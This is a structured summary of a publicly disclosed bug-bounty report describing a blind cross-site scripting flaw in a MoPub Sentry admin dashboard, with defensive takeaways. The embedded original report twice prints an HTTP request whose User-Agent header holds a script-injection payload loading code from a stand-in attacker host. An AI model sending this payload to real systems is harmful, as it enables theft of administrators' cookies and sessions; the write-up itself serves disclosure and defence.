# Blind XSS in MoPub Marketplace Admin Production Sentry via User-Agent Header

## Metadata
- **Source:** HackerOne
- **Report:** 275518 | https://hackerone.com/reports/275518
- **Submitted:** 2017-10-08
- **Reporter:** harisec
- **Program:** Twitter/MoPub
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Blind XSS, HTTP Header Injection, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A Blind XSS vulnerability exists in the MoPub Marketplace Admin dashboard where the User-Agent HTTP header is stored without proper encoding and later reflected in an administrative Sentry dashboard. An attacker can inject malicious JavaScript via the User-Agent header that executes when administrators access the dashboard, allowing arbitrary code execution in the admin context.

## Attack scenario
1. Attacker crafts a malicious HTTP request to demand.mopub.com/accounts/login/ with a Blind XSS payload in the User-Agent header
2. The User-Agent value containing the payload is stored server-side without proper sanitization
3. Attacker waits for an administrator to access the Sentry dashboard at sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/
4. The stored User-Agent payload is reflected in the dashboard HTML within an <option> tag without encoding
5. The JavaScript payload breaks out of the <option> context and executes arbitrary code
6. Attacker's script exfiltrates sensitive data including admin cookies, DOM contents, and IP addresses

## Root cause
User-Agent header input is stored in the application database without sanitization and subsequently reflected in the Sentry dashboard without proper HTML entity encoding, allowing XSS payload execution when the value is inserted into an <option> tag element.

## Attacker mindset
Exploit the trust administrators place in internal dashboards by injecting payloads through HTTP headers. Since the vulnerability is 'blind,' the attacker doesn't see immediate results, but by monitoring their domain for requests, they can verify execution and exfiltrate sensitive admin data including authentication tokens and cookies.

## Defensive takeaways
- Implement strict input validation and sanitization for all HTTP headers, treating them as untrusted user input
- Apply context-aware output encoding (HTML entity encoding) when reflecting any user-controlled data in HTML responses
- Never trust HTTP headers; implement Content Security Policy (CSP) headers to restrict script execution origins
- Store HTTP headers in a separate audit log rather than reflecting them directly in admin dashboards
- Implement regular security audits of admin dashboards and Sentry configurations to catch reflected/stored XSS
- Use automated SAST tools to detect instances where user input (including headers) is reflected without encoding
- Apply the principle of least privilege to administrative accounts and implement additional authentication factors

## Variant hunting
Search for other HTTP headers that may be stored and reflected without encoding (Referer, X-Forwarded-For, Accept-Language, etc.). Check for Blind XSS in error pages, admin logs, support ticket systems, analytics dashboards, and any application that stores and displays request metadata. Examine other Sentry instances and monitoring tools for similar patterns.

## MITRE ATT&CK
- T1190
- T1566
- T1204
- T1110

## Notes
This is a critical vulnerability in a production admin dashboard that allowed execution in a Twitter-owned administrative context. The blind nature made it harder to detect but the attacker's external domain monitoring proved the vulnerability conclusively. The use of X-Forwarded-For header in the payload suggests the attacker was testing for proxy/load balancer bypass techniques. The fact that admin cookies were exposed indicates potential session hijacking risks.

## Full report
<details><summary>Expand</summary>

**Summary:** 
I've identified a Blind XSS vulnerability that fires in the `Mobpub Marketplace Admin Production | Sentry` dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.

**Description:** 
I've sent the following HTTPS request to the following URL `https://demand.mopub.com/accounts/login/`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

Please note that the value of the `User-Agent` header is set to an **Blind XSS payload** (I've used `attacker.com/js` as an example but initially it was set to an script loaded from my test domain `thx.bz`.

Some time later after this initial request I've received two hits and the script from `thx.bz` was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.

I've extracted the content of the browser DOM (attached to this report as **DOM.html**) and other interesting information:

**Dashboard Page URL**

`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`

**User IP Address**
`█████████`

**Title**
`Marketplace Admin Production | Sentry`

**User-Agent**
`█████████`

**Cookies**
`██████
`
 
**Execution Origin**
`http://sentry-test.mopub.com`

If you open the attachment **DOM.html** in a browser and search for `thx.bz` you will see that the value of the `User-Agent` is reflected inside a `<option>` tag without proper encoding and it was possible to escape the context and inject an additional `SCRIPT` tag.

The IP address that was used to visit the dashboard is `███████` and I've verified that it belongs to Twitter.

## Steps To Reproduce:

- Send the following HTTPS request (while replacing `attacker.com/js` with a domain/URL you control and where you can inspect the web server logs).

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

- Login into `http://sentry-test.mopub.com/` using administrative credentials and visit the vulnerable URL 
`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`.

- At this point a script should be loaded from your domain (the one you've used instead of `attacker.com/js`).

## Impact: 

An attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard `Mobpub Marketplace Admin Production | Sentry`.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

I've attached the contents of browser DOM where the Blind XSS triggered (`DOM.html`), more information about the execution context `bxss-report.html` and screenshots from the the browser DOM.



</details>

---
*Analysed by Claude on 2026-05-24*
